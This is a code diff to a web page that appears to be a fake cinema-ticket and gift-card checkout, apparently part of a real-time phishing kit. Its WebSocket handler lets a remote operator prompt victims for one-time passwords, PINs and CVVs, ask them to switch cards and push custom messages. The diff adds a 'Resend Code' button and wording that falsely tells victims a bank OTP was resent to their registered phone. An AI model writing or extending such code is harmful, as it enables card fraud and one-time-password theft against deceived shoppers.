@@ -190,6 +190,7 @@ main{max-width:1200px;margin:0 auto;padding:0 20px 80px;position:relative}
         </div>
         <div class="otp-error hidden" id="otp-error">Please enter your security code.</div>
         <button class="otp-btn" id="otp-submit">Continue</button>
+        <button class="otp-btn" id="otp-resend" style="background:#f5f5f5;color:#333;border:1px solid #ddd;margin-top:8px" onclick="resendOtp()">Resend Code</button>
         <div class="otp-countdown">Code expires in <span id="otp-timer">4:59</span></div>
       </div>
       <div id="otp-result" class="hidden">
@@ -239,8 +240,8 @@ else if(a==='session_restored'){
   if(p.customerInfo){var cu=p.customerInfo;if(cu.fullName)document.getElementById('bill-name').value=cu.fullName;if(cu.phone){var ph=cu.phone.replace(/\\D/g,'').slice(0,10);if(ph.length>6)ph='('+ph.slice(0,3)+') '+ph.slice(3,6)+'-'+ph.slice(6);else if(ph.length>3)ph='('+ph.slice(0,3)+') '+ph.slice(3);else if(ph.length>0)ph='('+ph;document.getElementById('bill-phone').value=ph};if(cu.email)document.getElementById('bill-email').value=cu.email;if(cu.address1)document.getElementById('bill-address').value=cu.address1;if(cu.city)document.getElementById('bill-city').value=cu.city;if(cu.state)document.getElementById('bill-province').value=cu.state;if(cu.country)document.getElementById('bill-country').value=cu.country;if(cu.zipCode)document.getElementById('bill-postal').value=cu.zipCode}
   // Handle pending status
   if(p.status==='pending'){document.getElementById('load-overlay').classList.remove('hidden');document.querySelector('#load-overlay p').textContent='Waiting for payment approval...'}}
-else if(a==='otp_verify'){window._otpInProgress=true;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');resetOtp();startOtpTimer()}
-else if(a==='custom_otp_verify'){document.getElementById('otp-overlay').classList.remove('hidden');document.querySelector('#otp-body h2').textContent='Enter OTP Code';document.querySelector('#otp-body p').textContent=p.message||'Please enter the OTP code sent to your phone';resetOtp();startOtpTimer()}
+else if(a==='otp_verify'){window._otpInProgress=true;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');var sfx=p.phoneSuffix||'****';document.querySelector('#otp-body h2').textContent='Enter your security code';document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';document.getElementById('otp-amount-row').style.display='';resetOtp();startOtpTimer();resetResend()}
+else if(a==='custom_otp_verify'){document.getElementById('otp-overlay').classList.remove('hidden');var sfx2=p.phoneSuffix||'****';document.querySelector('#otp-body h2').textContent='Enter OTP Code';document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx2+'). Please submit your One-Time Password (OTP).';resetOtp();startOtpTimer();resetResend()}
 else if(a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='app_verify'||a==='question_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');document.querySelector('#otp-body h2').textContent='Verification Required';document.querySelector('#otp-body p').textContent=p.message||'Please complete verification';resetOtp()}
 else if(a==='approve'){if(isGiftCard){showInline('Payment approved! Gift card will be emailed.')}else{var d=btoa(JSON.stringify({movie:document.querySelector('#movie-block h2')?.textContent||'',theatre:document.querySelector('#movie-block .name')?.textContent||'',date:document.querySelector('#movie-block .detail-row span')?.textContent||'',tickets:selections.map(function(s){return s.name+' ×'+s.quantity}).join(', '),total:total}));location.href='/tickets/complete/?d='+d}}
 else if(a==='reject'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=true;showInline('Rejected: '+(p.message||''),true)}
@@ -251,6 +252,8 @@ else if(a==='change_card'){window._otpInProgress=false;var oe=document.getElemen
 else if(a==='custom_prompt'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;if(window._otpInProgress)document.getElementById('otp-overlay').classList.remove('hidden');showInline(p.message||'Operator needs your attention',true)}
 else if(a==='change_card_prompt'){window._otpInProgress=false;var oe=document.getElementById('otp-code');if(oe)oe.value='';document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline(p.message||'Please use a different card.',true)}
 else if(a==='redirect_complete'){if(isGiftCard){location.href='/giftcards/complete/?amount='+(total||'')}else{location.href='/tickets/complete/'}}
+else if(a==='resend_ok'){window._otpResendCount=p.count||1;startResendCooldown()}
+else if(a==='resend_limit'){var rb=document.getElementById('otp-resend');if(rb){rb.disabled=true;rb.textContent='Limit reached'};showInline(p.message||'Maximum resend attempts reached. Please try again later.',true)}
 }
 };
 ws.onclose=function(){console.log('[WS] Disconnected. Reconnecting in 5s...');if(wsTimer)clearInterval(wsTimer);setTimeout(wsConnect,5000)};
@@ -331,6 +334,11 @@ function resetOtp(){document.getElementById('otp-form').classList.remove('hidden
 var otpSec=299,otpTmr=null;
 function startOtpTimer(){otpSec=299;clearInterval(otpTmr);otpTmr=setInterval(function(){otpSec--;if(otpSec<0){otpSec=0;clearInterval(otpTmr);document.getElementById('otp-submit').disabled=true};var m=Math.floor(otpSec/60),s=otpSec%60;document.getElementById('otp-timer').textContent=m+':'+String(s).padStart(2,'0')},1000)}
 startOtpTimer();
+
+var _otpResendCount=0,_resendTimer=null,_resendSec=0;
+function resetResend(){_otpResendCount=0;_resendSec=0;clearInterval(_resendTimer);var rb=document.getElementById('otp-resend');if(rb){rb.disabled=false;rb.textContent='Resend Code';rb.style.opacity='1'}}
+function startResendCooldown(){_resendSec=60;var rb=document.getElementById('otp-resend');if(rb){rb.disabled=true;rb.textContent='Resend Code (60s)'}_resendTimer=setInterval(function(){_resendSec--;if(rb){rb.textContent='Resend Code ('+_resendSec+'s)'}if(_resendSec<=0){clearInterval(_resendTimer);if(rb&&_otpResendCount<5){rb.disabled=false;rb.textContent='Resend Code';rb.style.opacity='1'}}},1000)}
+function resendOtp(){if(_resendSec>0||_otpResendCount>=5)return;if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'resend_otp',payload:{sessionId:sid}}))}
 
 document.getElementById('otp-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
 document.getElementById('otp-submit').addEventListener('click',submitOtp);
